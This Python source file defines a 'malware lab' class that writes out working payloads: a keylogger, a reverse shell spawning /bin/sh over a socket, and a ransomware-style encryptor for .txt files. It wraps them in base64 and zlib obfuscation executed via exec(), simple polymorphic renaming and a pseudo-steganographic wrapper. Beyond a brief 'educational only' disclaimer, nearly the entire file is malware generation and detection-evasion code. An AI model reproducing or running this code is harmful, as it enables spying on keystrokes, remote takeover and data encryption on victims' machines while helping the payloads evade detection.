"""
Enhanced Malware Lab with Advanced Features
WARNING: For educational and authorized testing only.
"""
import os
import base64
import zlib
from typing import Dict, Optional
import tempfile


class EnhancedMalwareLab:
    """Enhanced malware creation with obfuscation and advanced features"""
    
    def __init__(self, isolated_mode: bool = True):
        self.isolated_mode = isolated_mode
        self.sandbox_path = tempfile.mkdtemp(prefix="malware_lab_")
    
    def create_obfuscated_payload(self, payload_type: str, obfuscation: str = "base64") -> Dict:
        """Create obfuscated payload"""
        # Create base payload
        base_payload = self._get_base_payload(payload_type)
        
        if obfuscation == "base64":
            obfuscated = self._obfuscate_base64(base_payload)
        elif obfuscation == "compression":
            obfuscated = self._obfuscate_compression(base_payload)
        elif obfuscation == "none":
            obfuscated = base_payload
        else:
            obfuscated = base_payload
        
        filepath = os.path.join(self.sandbox_path, f"{payload_type}_obfuscated.py")
        with open(filepath, 'w') as f:
            f.write(obfuscated)
        
        return {
            "type": payload_type,
            "file": filepath,
            "obfuscation": obfuscation,
            "warning": "Educational only. Use in isolated VM."
        }
    
    def _get_base_payload(self, payload_type: str) -> str:
        """Get base payload code"""
        payloads = {
            "keylogger": self._keylogger_code(),
            "reverse_shell": self._reverse_shell_code(),
            "file_encryptor": self._encryptor_code()
        }
        return payloads.get(payload_type, "")
    
    def _keylogger_code(self) -> str:
        return '''import pynput
from pynput import keyboard
import logging
import os

log_file = os.path.join(os.getenv("TEMP", "/tmp"), "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    
    def _reverse_shell_code(self) -> str:
        return '''import socket
import subprocess
import os

HOST = "127.0.0.1"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
    
    def _encryptor_code(self) -> str:
        return '''from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
cipher = Fernet(key)

for file in os.listdir('.'):
    if file.endswith('.txt'):
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file + '.encrypted', 'wb') as f:
            f.write(encrypted)

print(f"Key: {key.decode()}")
'''
    
    def _obfuscate_base64(self, code: str) -> str:
        """Obfuscate code using base64"""
        encoded = base64.b64encode(code.encode()).decode()
        return f'''import base64
exec(base64.b64decode("{encoded}").decode())
'''
    
    def _obfuscate_compression(self, code: str) -> str:
        """Obfuscate code using compression"""
        compressed = zlib.compress(code.encode())
        encoded = base64.b64encode(compressed).decode()
        return f'''import zlib, base64
exec(zlib.decompress(base64.b64decode("{encoded}")).decode())
'''
    
    def create_polymorphic_payload(self, payload_type: str) -> Dict:
        """Create polymorphic payload (changes each generation)"""
        import random
        import string
        
        # Add random variable names
        var_names = [''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(5)]
        
        base_code = self._get_base_payload(payload_type)
        # Simple polymorphism: replace common patterns
        polymorphic = base_code.replace("key", var_names[0])
        polymorphic = polymorphic.replace("data", var_names[1])
        
        filepath = os.path.join(self.sandbox_path, f"{payload_type}_polymorphic.py")
        with open(filepath, 'w') as f:
            f.write(polymorphic)
        
        return {
            "type": payload_type,
            "file": filepath,
            "polymorphic": True,
            "warning": "Educational only."
        }
    
    def create_steganography_payload(self, payload_type: str, carrier_file: str) -> Dict:
        """Hide payload in carrier file (steganography)"""
        # Simplified steganography example
        payload_code = self._get_base_payload(payload_type)
        
        # Encode payload in image or text file
        # This is a simplified example
        stego_code = f'''
# Steganographic payload
carrier = "{carrier_file}"
payload = "{base64.b64encode(payload_code.encode()).decode()}"

# Extract and execute (simplified)
import base64
exec(base64.b64decode(payload).decode())
'''
        
        filepath = os.path.join(self.sandbox_path, f"{payload_type}_stego.py")
        with open(filepath, 'w') as f:
            f.write(stego_code)
        
        return {
            "type": payload_type,
            "file": filepath,
            "steganography": True,
            "warning": "Educational only."
        }
